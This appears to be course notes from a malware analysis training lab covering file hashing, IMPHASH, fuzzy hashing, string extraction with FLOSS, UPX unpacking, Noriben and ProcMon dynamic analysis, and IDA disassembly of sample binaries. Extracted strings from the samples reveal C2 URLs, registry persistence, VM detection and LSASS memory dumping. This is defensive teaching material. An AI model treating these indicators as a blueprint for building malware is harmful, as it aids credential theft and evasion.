## Malware Fingerprinting

In this stage, our mission is to create a unique identifier for the malware sample. This typically takes the form of a cryptographic hash - **MD5, SHA1, or SHA256.**

**Fingerprinting is employed for numerous purposes, encompassing:**

- Identification and tracking of malware samples
- Scanning an entire system for the presence of identical malware
- Confirmation of previous encounters and analyses of the same malware
- Sharing with stakeholders as IoC (Indicators of Compromise) or as part of threat intelligence reports


**As an illustration, to check the MD5 file hash of the abovementioned malware we can use the Get-FileHash PowerShell cmdlet as follows.**

```
PS C:\Users\htb-student> Get-FileHash -Algorithm MD5 C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             DB349B97C37D22F5EA1D1841E3C89EB4  
```

**To check the SHA256 file hash of the abovementioned malware the command would be the following.**


```
PS C:\Users\htb-student> Get-FileHash -Algorithm SHA256 C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          24D004A104D4D54034DBCFFC2A4B19A11F39008A575AA614EA04703480B1022C
```

**File Hash Lookup**

The ensuing step involves checking the file hash produced in the prior step against online malware scanners and sandboxes such as Cuckoo sandbox. For instance, VirusTotal, an online malware scanning engine, which collaborates with various antivirus vendors, allows us to search for the file hash. This step aids us in comparing our results with existing knowledge about the malware sample.

**The following image displays the results from VirusTotal after the SHA256 file hash of the aforementioned malware was submitted.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/75996ce4-03e3-4e8d-bd1e-1ff414ba8d19)


Even though a file hash like MD5, SHA1, or SHA256 is valuable for identifying identical samples with disparate names, it falls short when identifying similar malware samples. This is primarily because a malware author can alter the file hash value by making minor modifications to the code and recompiling it.

**Nonetheless, there exist techniques that can aid in identifying similar samples:**

### Import Hashing (IMPHASH)

IMPHASH, an abbreviation for "Import Hash", is a cryptographic hash calculated from the import functions of a Windows Portable Executable (PE) file. Its algorithm functions by first converting all imported function names to lowercase. Following this, the DLL names and function names are fused together and arranged in alphabetical order. Finally, an MD5 hash is generated from the resulting string. Therefore, two PE files with identical import functions, in the same sequence, will share an IMPHASH value.

**We can find the IMPHASH in the Details tab of the VirusTotal results.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8219bb59-a2b5-4090-9829-cc00265be525)


**Note that we can also use the pefile Python module to compute the IMPHASH of a file as follows.**


```
import sys
import pefile
import peutils

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
imphash = pe.get_imphash()

print(imphash)
```

To check the IMPHASH of the abovementioned WannaCry malware the command would be the following. **imphash_calc.py** contains the Python code above.


```
C:\Scripts> python imphash_calc.py C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe
9ecee117164e0b870a53dd187cdd7174
```

## Fuzzy Hashing (SSDEEP)

Fuzzy Hashing (SSDEEP), also referred to as context-triggered piecewise hashing (CTPH), is a hashing technique designed to compute a hash value indicative of content similarity between two files. This technique dissects a file into smaller, fixed-size blocks and calculates a hash for each block. The resulting hash values are then consolidated to generate the final fuzzy hash.

The SSDEEP algorithm allocates more weight to longer sequences of common blocks, making it highly effective in identifying files that have undergone minor modifications, or are similar but not identical, such as different variations of a malicious sample.

We can find the SSDEEP hash of a malware in the Details tab of the VirusTotal results.

We can also use the ssdeep tool (available at C:\Tools\ssdeep-2.14.1) to calculate the SSDEEP hash of a file. To check the SSDEEP hash of the abovementioned WannaCry malware the command would be the following.

```
C:\Tools\ssdeep-2.14.1> ssdeep.exe C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe
ssdeep,1.1--blocksize:hash:hash,filename
98304:wDqPoBhz1aRxcSUDk36SAEdhvxWa9P593R8yAVp2g3R:wDqPe1Cxcxk3ZAEUadzR8yc4gB,"C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe"
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b506c3ea-b7ff-43fb-8b40-178a235192e7)


## Section Hashing (Hashing PE Sections)

Section hashing, (hashing PE sections) is a powerful technique that allows analysts to identify sections of a Portable Executable (PE) file that have been modified. This can be particularly useful for identifying minor variations in malware samples, a common tactic employed by attackers to evade detection.

The Section Hashing technique works by calculating the cryptographic hash of each of these sections. When comparing two PE files, if the hash of corresponding sections in the two files matches, it suggests that the particular section has not been modified between the two versions of the file.

By applying section hashing, security analysts can identify parts of a PE file that have been tampered with or altered. This can help identify similar malware samples, even if they have been slightly modified to evade traditional signature-based detection methods.

Tools such as pefile in Python can be used to perform section hashing. In Python, for example, you can use the pefile module to access and hash the data in individual sections of a PE file as follows.

```
import sys
import pefile
pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print (section.Name, "MD5 hash:", section.get_hash_md5())
    print (section.Name, "SHA256 hash:", section.get_hash_sha256())
```

Remember that while section hashing is a powerful technique, it is not foolproof. Malware authors might employ tactics like section name obfuscation or dynamically generating section names to try and bypass this kind of analysis.

**As an illustration, to check the MD5 file hash of the abovementioned malware we can use pestudio (available at C:\Tools\pestudio\pestudio) as follows.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a22c9d0e-82ab-4400-8be3-0e346389d814)


## String Analysis

In this phase, our objective is to extract strings (ASCII & Unicode) from a binary. Strings can furnish clues and valuable insight into the functionality of the malware. Occasionally, we can unearth unique embedded strings in a malware sample, such as:

- Embedded filenames (e.g., dropped files)
- IP addresses or domain names
- Registry paths or keys
- Windows API functions
- Command-line arguments
- Unique information that might hint at a particular threat actor

The Windows strings binary from Sysinternals can be deployed to display the strings contained within a malware. For instance, the command below will reveal strings for a ransomware sample named dharma_sample.exe residing in the C:\Samples\MalwareAnalysis directory of this section's target.

```
C:\Users\htb-student> strings C:\Samples\MalwareAnalysis\dharma_sample.exe

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
gaT
Rich
.text
`.rdata
@.data
HQh
9A s
9A$v
---SNIP---
GetProcAddress
LoadLibraryA
WaitForSingleObject
InitializeCriticalSectionAndSpinCount
LeaveCriticalSection
GetLastError
EnterCriticalSection
ReleaseMutex
CloseHandle
KERNEL32.dll
RSDS%~m
#ka
C:\crysis\Release\PDB\payload.pdb
---SNIP---
```

## The FLOSS tool is also available for Windows Operating Systems.

**The command below will reveal strings for a malware sample named shell.exe residing in the C:\Samples\MalwareAnalysis directory of this section's target.**

```
C:\Samples\MalwareAnalysis> floss shell.exe
INFO: floss: extracting static strings...
finding decoding function features: 100%|████████████████████████████████████████████| 85/85 [00:00<00:00, 1361.51 functions/s, skipped 0 library functions]
INFO: floss.stackstrings: extracting stackstrings from 56 functions
INFO: floss.results: AQAPRQVH1
INFO: floss.results: JJM1
INFO: floss.results: RAQH
INFO: floss.results: AXAX^YZAXAYAZH
INFO: floss.results: XAYZH
INFO: floss.results: ws232
extracting stackstrings: 100%|██████████████████████████████████████████████████████████████████████████████████████| 56/56 [00:00<00:00, 81.46 functions/s]
INFO: floss.tightstrings: extracting tightstrings from 4 functions...
extracting tightstrings from function 0x402a90: 100%|█████████████████████████████████████████████████████████████████| 4/4 [00:00<00:00, 25.59 functions/s]
INFO: floss.string_decoder: decoding strings
emulating function 0x402a90 (call 1/1): 100%|███████████████████████████████████████████████████████████████████████| 22/22 [00:14<00:00,  1.51 functions/s]
INFO: floss: finished execution after 25.20 seconds


FLARE FLOSS RESULTS (version v2.3.0-0-g037fc4b)

+------------------------+------------------------------------------------------------------------------------+
| file path              | shell.exe                                                                          |
| extracted strings      |                                                                                    |
|  static strings        | 254                                                                                |
|  stack strings         | 6                                                                                  |
|  tight strings         | 0                                                                                  |
|  decoded strings       | 0                                                                                  |
+------------------------+------------------------------------------------------------------------------------+


 ──────────────────────
  FLOSS STATIC STRINGS
 ──────────────────────

+-----------------------------------+
| FLOSS STATIC STRINGS: ASCII (254) |
+-----------------------------------+

!This program cannot be run in DOS mode.
.text
P`.data
.rdata
`@.pdata
0@.xdata
0@.bss
.idata
.CRT
.tls
8MZu
HcP<H
D$ H
AUATUWVSH
D$ L
---SNIP---
C:\Windows\System32\notepad.exe
Message
Connection sent to C2
[-] Error code is : %lu
AQAPRQVH1
JJM1
RAQH
AXAX^YZAXAYAZH
XAYZH
ws2_32
PPM1
APAPH
WWWM1
VPAPAPAPI
Windows-Update/7.6.7600.256 %s
1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71
open
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
WindowsUpdater
---SNIP---
TEMP
svchost.exe
%s\%s
http://ms-windows-update.com/svchost.exe
45.33.32.156
Sandbox detected
iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
SOFTWARE\VMware, Inc.\VMware Tools
InstallPath
C:\Program Files\VMware\VMware Tools\
Failed to open the registry key.
Unknown error
Argument domain error (DOMAIN)
Overflow range error (OVERFLOW)
Partial loss of significance (PLOSS)
Total loss of significance (TLOSS)
The result is too small to be represented (UNDERFLOW)
Argument singularity (SIGN)
_matherr(): %s in %s(%g, %g)  (retval=%g)
Mingw-w64 runtime failure:
Address %p has no image-section
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
.pdata
RegCloseKey
RegOpenKeyExA
RegQueryValueExA
RegSetValueExA
CloseHandle
CreateFileA
CreateProcessA
CreateRemoteThread
DeleteCriticalSection
EnterCriticalSection
GetComputerNameA
GetCurrentProcess
GetCurrentProcessId
GetCurrentThreadId
GetLastError
GetStartupInfoA
GetSystemTimeAsFileTime
GetTickCount
InitializeCriticalSection
LeaveCriticalSection
OpenProcess
QueryPerformanceCounter
RtlAddFunctionTable
RtlCaptureContext
RtlLookupFunctionEntry
RtlVirtualUnwind
SetUnhandledExceptionFilter
Sleep
TerminateProcess
TlsGetValue
UnhandledExceptionFilter
VirtualAllocEx
VirtualProtect
VirtualQuery
WriteFile
WriteProcessMemory
__C_specific_handler
__getmainargs
__initenv
__iob_func
__lconv_init
__set_app_type
__setusermatherr
_acmdln
_amsg_exit
_cexit
_fmode
_initterm
_onexit
_vsnprintf
abort
calloc
exit
fprintf
free
fwrite
getenv
malloc
memcpy
printf
puts
signal
sprintf
strcmp
strlen
strncmp
vfprintf
ShellExecuteA
MessageBoxA
InternetCloseHandle
InternetOpenA
InternetOpenUrlA
InternetReadFile
WSACleanup
WSAStartup
closesocket
connect
freeaddrinfo
getaddrinfo
htons
inet_addr
socket
ADVAPI32.dll
KERNEL32.dll
msvcrt.dll
SHELL32.dll
USER32.dll
WININET.dll
WS2_32.dll


+------------------------------------+
| FLOSS STATIC STRINGS: UTF-16LE (0) |
+------------------------------------+





 ─────────────────────
  FLOSS STACK STRINGS
 ─────────────────────

AQAPRQVH1
JJM1
RAQH
AXAX^YZAXAYAZH
XAYZH
ws232


 ─────────────────────
  FLOSS TIGHT STRINGS
 ─────────────────────



 ───────────────────────
  FLOSS DECODED STRINGS
 ───────────────────────
```


## Unpacking UPX-packed Malware

**In our static analysis, we might stumble upon a malware sample that's been compressed or obfuscated using a technique referred to as packing. Packing serves several purposes:**

- It obfuscates the code, making it more challenging to discern its structure or functionality.
- It reduces the size of the executable, making it quicker to transfer or less conspicuous.
- It confounds security researchers by hindering traditional reverse engineering attempts.


This can impair string analysis because the references to strings are typically obscured or eliminated. It also replaces or camouflages conventional PE sections with a compact loader stub, which retrieves the original code from a compressed data section. As a result, the malware file becomes both smaller and more difficult to analyze, as the original code isn't directly observable.

A popular packer used in many malware variants is the Ultimate Packer for Executables (UPX).

**Let's first see what happens when we run the strings command on a UPX-packed malware sample named credential_stealer.exe residing in the C:\Samples\MalwareAnalysis\packed directory of this section's target.**

```
C:\Users\htb-student> strings C:\Samples\MalwareAnalysis\packed\credential_stealer.exe

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
UPX0
UPX1
UPX2
3.96
UPX!
ff.
8MZu
HcP<H
tY)
L~o
tK1
7c0
VDgxt
amE
8#v
$ /uX
OAUATUWVSH
Z6L
<=h
%0rv
o?H9
7sk
3H{
HZu
'.}
c|/
c`fG
Iq%
[^_]A\A]
> -P
fo{Wnl
c9"^$!=
;\V
%&m
')A
v/7>
07ZC
_L$AAl
mug.%(
t%n
#8%,X
e]'^
(hk
Dks
zC:
Vj<
w~5
m<6
|$PD
c(t
\3_
---SNIP---
```

**Observe the strings that include UPX, and take note that the remainder of the output doesn't yield any valuable information regarding the functionality of the malware.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b0ddc1b8-ad39-4dfc-b1ef-34225e54a16e)


We can unpack the malware using the UPX tool (available at C:\Tools\upx\upx-4.0.2-win64) with the following command.

```
C:\Tools\upx\upx-4.0.2-win64> upx -d -o unpacked_credential_stealer.exe C:\Samples\MalwareAnalysis\packed\credential_stealer.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2023
UPX 4.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 30th 2023

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     16896 <-      8704   51.52%    win64/pe     unpacked_credential_stealer.exe

Unpacked 1 file.
```

Let's now run the strings command on the unpacked sample.

```
C:\Tools\upx\upx-4.0.2-win64> strings unpacked_credential_stealer.exe

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
.text
P`.data
.rdata
`@.pdata
0@.xdata
0@.bss
.idata
.CRT
.tls
ff.
8MZu
HcP<H
---SNIP---
D$(
D$
D$0
D$(
D$
t'H
%5T
@A\A]A^
SeDebugPrivilege
SE Debug Privilege is adjusted
lsass.exe
Searching lsass PID
Lsass PID is: %lu
Error is - %lu
lsassmem.dmp
LSASS Memory is dumped successfully
Err 2: %lu
@u@
`p@
Unknown error
Argument domain error (DOMAIN)
Overflow range error (OVERFLOW)
Partial loss of significance (PLOSS)
Total loss of significance (TLOSS)
The result is too small to be represented (UNDERFLOW)
Argument singularity (SIGN)
_matherr(): %s in %s(%g, %g)  (retval=%g)
Mingw-w64 runtime failure:
Address %p has no image-section
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
.pdata
 0@
00@
`E@
`E@
@v@
hy@
`y@
@p@
0v@
Pp@
AdjustTokenPrivileges
LookupPrivilegeValueA
OpenProcessToken
MiniDumpWriteDump
CloseHandle
CreateFileA
CreateToolhelp32Snapshot
DeleteCriticalSection
EnterCriticalSection
GetCurrentProcess
GetCurrentProcessId
GetCurrentThreadId
GetLastError
GetStartupInfoA
GetSystemTimeAsFileTime
GetTickCount
InitializeCriticalSection
LeaveCriticalSection
OpenProcess
Process32First
Process32Next
QueryPerformanceCounter
RtlAddFunctionTable
RtlCaptureContext
RtlLookupFunctionEntry
RtlVirtualUnwind
SetUnhandledExceptionFilter
Sleep
TerminateProcess
TlsGetValue
UnhandledExceptionFilter
VirtualProtect
VirtualQuery
__C_specific_handler
__getmainargs
__initenv
__iob_func
__lconv_init
__set_app_type
__setusermatherr
_acmdln
_amsg_exit
_cexit
_fmode
_initterm
_onexit
abort
calloc
exit
fprintf
free
fwrite
malloc
memcpy
printf
puts
signal
strcmp
strlen
strncmp
vfprintf
ADVAPI32.dll
dbghelp.dll
KERNEL32.DLL
msvcrt.dll
```

## Dynamic Analysis


When it comes to the domain of malware analysis, dynamic or behavioral analysis represents an indispensable approach in our investigative arsenal. In dynamic analysis, we observe and interpret the behavior of the malware while it is running, or in action. This is a critical contrast to static analysis, where we dissect the malware's properties and contents without executing it. The primary goal of dynamic analysis is to document and understand the real-world impact of the malware on its host environment, making it an integral part of comprehensive malware analysis.

In executing dynamic analysis, we encapsulate the malware within a tightly controlled, monitored, and usually isolated environment to prevent any unintentional spread or damage. This environment is typically a virtual machine (VM) to which the malware is oblivious. It believes it is interacting with a genuine system, while we, as researchers, have full control over its interactions and can document its behavior thoroughly.



**Our dynamic analysis procedure can be broken down into the following steps:**

**Environment Setup:** We first establish a secure and controlled environment, typically a VM, isolated from the rest of the network to prevent inadvertent contamination or propagation of the malware. The VM setup should mimic a real-world system, complete with software, applications, and network configurations that an actual user might have.

**Baseline Capture:** After the environment is set up, we capture a snapshot of the system's clean state. This includes system files, registry states, running processes, network configuration, and more. This baseline serves as a reference point to identify changes made by the malware post-execution.

**Tool Deployment (Pre-Execution):** To capture the activities of the malware effectively, we deploy various monitoring and logging tools. Tools such as Process Monitor (Procmon) from Sysinternals Suite are used to log system calls, file system activity, registry operations, etc. We can also employ utilities like Wireshark, tcpdump, and Fiddler for capturing network traffic, and Regshot to take before-and-after snapshots of the system registry. Finally, tools such as INetSim, FakeDNS, and FakeNet-NG are used to simulate internet services.

**Malware Execution:** With our tools running and ready, we proceed to execute the malware sample in the isolated environment. During execution, the monitoring tools capture and log all activities, including process creation, file and registry modifications, network traffic, etc.

**Observation and Logging:** The malware sample is allowed to execute for a sufficient duration. All the while, our monitoring tools are diligently recording its every move, which will provide us with comprehensive insight into its behavior and modus operandi.

**Analysis of Collected Data:** After the malware has run its course, we halt its execution and stop the monitoring tools. We now examine the logs and data collected, comparing the system's state to our initial baseline to identify the changes introduced by the malware.


In some cases, when the malware is particularly evasive or complex, we might employ sandboxed environments for dynamic analysis. Sandboxes, such as Cuckoo Sandbox, Joe Sandbox, or FireEye's Dynamic Threat Intelligence cloud, provide an automated, safe, and highly controlled environment for malware execution. They come equipped with numerous features for in-depth behavioral analysis and generate detailed reports regarding the malware's network behavior, file system interaction, memory footprint, and more.

However, it's important to remember that while sandbox environments are valuable tools, they are not foolproof. Some advanced malware can detect sandbox environments and alter their behavior accordingly, making it harder for researchers to ascertain their true nature.


## Dynamic Analysis With Noriben ( https://github.com/Rurik/Noriben)

Noriben is a powerful tool in our dynamic analysis toolkit, essentially acting as a Python wrapper for Sysinternals ProcMon, a comprehensive system monitoring utility. It orchestrates the operation of ProcMon, refines the output, and adds a layer of malware-specific intelligence to the process. Leveraging Noriben, we can capture malware behaviors more conveniently and understand them more precisely.

To understand how Noriben empowers our dynamic analysis efforts, let's first quickly review ProcMon. This tool, from Sysinternals Suite, monitors real-time file system, Registry, and process/thread activity. It combines the features of utilities like Filemon, Regmon, and advanced features like filtering, advanced highlighting, and extensive event properties, making it a powerful system monitoring tool for malware analysis.

However, the volume and breadth of information that ProcMon collects can be overwhelming. Without proper filtering and contextual analysis, sifting through this raw data becomes a considerable challenge. This is where Noriben steps in. It uses ProcMon to capture system events but then filters and analyzes this data to extract meaningful information and pinpoint malicious activities.


**In our dynamic malware analysis process, here's how we employ Noriben:**


**Setting Up Noriben:** We initiate Noriben by launching it from the command line. The tool supports numerous command-line arguments to customize its operation. For instance, we can define the duration of data collection, specify a custom malware sample for execution, or select a personalized ProcMon configuration file.

**Launching ProcMon:** Upon initiation, Noriben starts ProcMon with a predefined configuration. This configuration contains a set of filters designed to exclude normal system activity and focus on potential indicators of malicious actions.

**Executing the Malware Sample:** With ProcMon running, Noriben executes the selected malware sample. During this phase, ProcMon captures all system activities, including process operations, file system changes, and registry modifications.

**Monitoring and Logging:** Noriben controls the duration of monitoring, and once it concludes, it commands ProcMon to save the collected data to a CSV file and then terminates ProcMon.

**Data Analysis and Reporting:** This is where Noriben shines. It processes the CSV file generated by ProcMon, applying additional filters and performing contextual analysis. Noriben identifies potentially suspicious activities and organizes them into different categories, such as file system activity, process operations, and network connections. This process results in a clear, readable report in HTML or TXT format, highlighting the behavioral traits of the analyzed malware.


Noriben's integration with YARA rules is another notable feature. We can leverage YARA rules to enhance our data filtering capabilities, allowing us to identify patterns of interest more efficiently.

**For demonstration purposes, we'll conduct dynamic analysis on a malware specimen named shell.exe, found in the C:\Samples\MalwareAnalysis directory on this section's target machine. Follow these steps:**

- Launch a new Command Line interface and make your way to the C:\Tools\Noriben-master directory.

- Initiate Noriben as indicated.

```
C:\Tools\Noriben-master> python .\Noriben.py
[*] Using filter file: ProcmonConfiguration.PMC
[*] Using procmon EXE: C:\ProgramData\chocolatey\bin\procmon.exe
[*] Procmon session saved to: Noriben_27_Jul_23__23_40_319983.pml
[*] Launching Procmon ...
[*] Procmon is running. Run your executable now.
[*] When runtime is complete, press CTRL+C to stop logging.
```

- Upon seeing the User Account Control prompt, select Yes.

- Proceed to C:\Samples\MalwareAnalysis and activate shell.exe by double-clicking.

- shell.exe will identify it is running within a sandbox. Close the window it created.

- Terminate ProcMon.

- In the Command Prompt running Noriben, use the Ctrl+C command to cease its operation.

```
C:\Tools\Noriben-master> python .\Noriben.py
[*] Using filter file: ProcmonConfiguration.PMC
[*] Using procmon EXE: C:\ProgramData\chocolatey\bin\procmon.exe
[*] Procmon session saved to: Noriben_27_Jul_23__23_40_319983.pml
[*] Launching Procmon ...
[*] Procmon is running. Run your executable now.
[*] When runtime is complete, press CTRL+C to stop logging.

[*] Termination of Procmon commencing... please wait
[*] Procmon terminated
[*] Saving report to: Noriben_27_Jul_23__23_42_335666.txt
[*] Saving timeline to: Noriben_27_Jul_23__23_42_335666_timeline.csv
[*] Exiting with error code: 0: Normal exit
```

**You'll observe that Noriben generates a .txt report inside it's directory, compiling all the behavioral information it managed to gather.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8dd3d44a-4366-463f-b169-44619f412732)

As discussed, Noriben uses ProcMon to capture system events but then filters and analyzes this data to extract meaningful information and pinpoint malicious activities.

Noriben might filter out some potentially valuable information. For instance, we don't receive any insightful data from Noriben's report about how shell.exe recognized that it was functioning within a sandbox or virtual machine.

Let's take a different approach and manually launch ProcMon (available at C:\Tools\sysinternals) using its default, more inclusive, configuration. Following this, let's re-run shell.exe. This might give us insights into how shell.exe detects the presence of a sandbox or virtual machine.

Then, let's configure the filter (Ctrl+L) as follows and press Apply.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/49e5f543-22bc-4116-90dc-1bee0e2fb8b8)

Finally, let's navigate to the end of the results. There can observe that shell.exe conducts sandbox or virtual machine detection by querying the registry for the presence of VMware Tools.

## Code Analysis
### Reverse Engineering & Code Analysis

Reverse engineering is a process that takes us beneath the surface of executable files or compiled machine code, enabling us to decode their functionality, behavioral traits, and structure. With the absence of source code, we turn to the analysis of disassembled code instructions, also known as assembly code analysis. This deeper level of understanding helps us to uncover obscured or elusive functionalities that remain hidden even after static and dynamic analysis.

**To untangle the complex web of machine code, we turn to a duo of powerful tools: Disassemblers and Debuggers.**

- A Disassembler is our tool of choice when we wish to conduct a static analysis of the code, meaning that we need not execute the code. This type of analysis is invaluable as it helps us to understand the structure and logic of the code without activating potentially harmful functionalities. Some prime examples of disassemblers include IDA, Cutter, and Ghidra.

- A Debugger, on the other hand, serves a dual purpose. Like a disassembler, it decodes machine code into assembly instructions. Additionally, it allows us to execute code in a controlled manner, proceeding instruction by instruction, skipping to specific locations, or halting the execution flow at designated points using breakpoints. Examples of debuggers include x32dbg, x64dbg, IDA, and OllyDbg.

Let's take a step back and understand the challenge before us. The journey of code from human-readable high-level languages, such as C or C++, to machine code is a one-way ticket, guided by the compiler. Machine code, a binary language that computers process directly, is a cryptic narrative for human analysts. Here's where the assembly language comes into play, acting as a bridge between us and the machine code, enabling us to decode the latter's story.

A disassembler transforms machine code back into assembly language, presenting us with a readable sequence of instructions. Understanding assembly and its mnemonics is pivotal in dissecting the functionality of malware.

Code analysis is the process of scrutinizing and deciphering the behavior and functionality of a compiled program or binary. This involves analyzing the instructions, control flow, and data structures within the code, ultimately shedding light on the purpose, functionality, and potential indicators of compromise (IOCs).

Understanding a program or a piece of malware often requires us to reverse the compilation process. This is where Disassembly comes into the picture. By converting machine code back into assembly language instructions, we end up with a set of instructions that are symbolic and mnemonic, enabling us to decode the logic and workings of the program.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f3b8b0f5-5826-4e45-99d2-5b95e506cf4d)


Disassemblers are our allies in this process. These specialized tools take the binary code, generate the corresponding assembly instructions, and often supplement them with additional context such as memory addresses, function names, and control flow analysis. One such powerful tool is IDA, a widely used disassembler and debugger revered for its advanced analysis features. It supports multiple executable file formats and architectures, presenting a comprehensive disassembly view and potent analysis capabilities.


## Code Analysis Example: shell.exe


Let's persist with the analysis of the shell.exe malware sample residing in the C:\Samples\MalwareAnalysis directory of this section's target. Up until this point, we've discovered that it conducts sandbox detection, and that it includes a possible sleep mechanism - a 5-second ping delay - before executing its intended operations.

Importing a Malware Sample into the Disassembler - IDA
For the next stage in our investigation, we must scrutinize the code in IDA to ascertain its further actions and discover how to circumvent the sandbox check employed by the malware sample.

We can initiate IDA either by double-clicking the IDA shortcut that is placed on the Desktop or by right-clicking it and selecting Run as administrator to ensure proper access rights. At first, it will display the license information and subsequently prompt us to open a new executable for analysis.

Next, opt for New and select the shell.exe sample residing in the C:\Samples\MalwareAnalysis directory of this section's target to dissect.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6129e950-b5a4-4fc3-8938-458c043a23d1)


The Load a new file dialog box that pops up next is where we can select the processor architecture. Choose the correct one and click OK. By default, IDA determines the appropriate processor type.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/57683505-f962-4c84-951c-253d6213304c)


After we hit OK, IDA will load the executable file into memory and disassemble the machine code to render the disassembled output for us. The screenshot below illustrates the different views in IDA.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c3a55b7e-d1e9-4962-866d-5efaab26ce9e)


Once the executable is loaded and the analysis completes, the disassembled code of the sample shell.exe will be exhibited in the main IDA-View window. We can traverse through the code using the cursor keys or the scroll bar and zoom in or out using the mouse wheel or the zoom controls.

### Text and Graph Views

The disassembled code is presented in two modes, namely the Graph view and the Text view. The default view is the Graph view, which provides a graphic illustration of the function's basic blocks and their interconnections. Basic blocks are instruction sequences with a single entry and exit point. These basic blocks are symbolized as nodes in the graph view, with the connections between them as edges.

To toggle between the graph and text views, simply press the spacebar button.


- The Graph view offers a pictorial representation of the program's control flow, facilitating a better understanding of execution flow, identification of loops, conditionals, and jumps, and a visualization of how the program branches or cycles through different code paths.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/1440764b-f617-47dc-add2-b380edb9aa2b)

The functions are displayed as nodes in the Graph view. Each function is depicted as a distinct node with a unique identifier and additional details such as the function name, address, and size.

- The Text view displays the assembly instructions along with their corresponding memory addresses. Each line in the Text view represents an instruction or a data element in the code, beginning with the section name:virtual address format (for example, .text:00000000004014F0, where the section name is .text and the virtual address is 00000000004014F0).

```
Tool : IDA

text:00000000004014F0 ; =============== S U B R O U T I N E =======================================
text:00000000004014F0
text:00000000004014F0
text:00000000004014F0                 public start
text:00000000004014F0 start           proc near               ; DATA XREF: .pdata:000000000040603C↓o
text:00000000004014F0
text:00000000004014F0 ; FUNCTION CHUNK AT 			.text:00000000004022A0 SIZE 000001B0 BYTES
text:00000000004014F0
text:00000000004014F0 ; __unwind { // __C_specific_handler
text:00000000004014F0                 sub     rsp, 28h
text:00000000004014F4
text:00000000004014F4 loc_4014F4:                             ; DATA XREF: .xdata:0000000000407058↓o
text:00000000004014F4 ;   __try { // __except at loc_40150C
text:00000000004014F4                 mov     rax, cs:off_405850
text:00000000004014FB                 mov     dword ptr [rax], 0
text:0000000000401501                 call    sub_401650
text:0000000000401506                 call    sub_401180
text:000000000040150B                 nop
text:000000000040150B ;   } // starts at 4014F4

```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/ceaeb0ec-8394-495a-9a0c-1af8e40b934a)

**IDA's Text view employs arrows to signify different types of control flow instructions and jumps. Here are some commonly seen arrows and their interpretations:**


- Solid Arrow (→): A solid arrow denotes a direct jump or branch instruction, indicating an unconditional shift in the program's flow where execution moves from one location to another. This occurs when a jump or branch instruction like jmp or call is encountered.
- Dashed Arrow (---→): A dashed arrow represents a conditional jump or branch instruction, suggesting that the program's flow might change based on a specific condition. The destination of the jump depends on the condition's outcome. For instance, a jz (jump if zero) instruction will trigger a jump only if a previous comparison yielded a zero value.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a510fbc9-2c77-4483-abcb-5446e7fbf220)


By default, IDA initially exhibits the main function or the function at the program's designated entry point. However, we have the liberty to explore and examine other functions in the graph view.

## Recognizing the Main Function in IDA

The following screenshot demonstrates the start function, which is the program's entry point and is generally responsible for setting up the runtime environment before invoking the actual main function. This is the initial start function shown by IDA after the executable is loaded.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d3f4c5db-29c1-4d50-8815-4b1a150dd980)

Our objective is to locate the actual main function, which necessitates further exploration of the disassembly. We will search for function calls or jumps that lead to other functions, as one of them is likely to be the main function. IDA's graph view, cross-references, or function list can aid in navigating through the disassembly and identifying the main function.

However, to reach the main function, we first need to understand the function of this start function. This function primarily consists of some initialization code, exception handling, and function calls. It eventually jumps to the loc_40150C label, which is an exception handler. Therefore, we can infer that this is not the actual main function where the program logic typically resides. We will inspect the other function calls to identify the main function.

**The code commences by subtracting 0x28 (40 in decimal) from the rsp (stack pointer) register, effectively creating space on the stack for local variables and preserving the previous stack contents.**


```
Code: ida


public start
start proc near

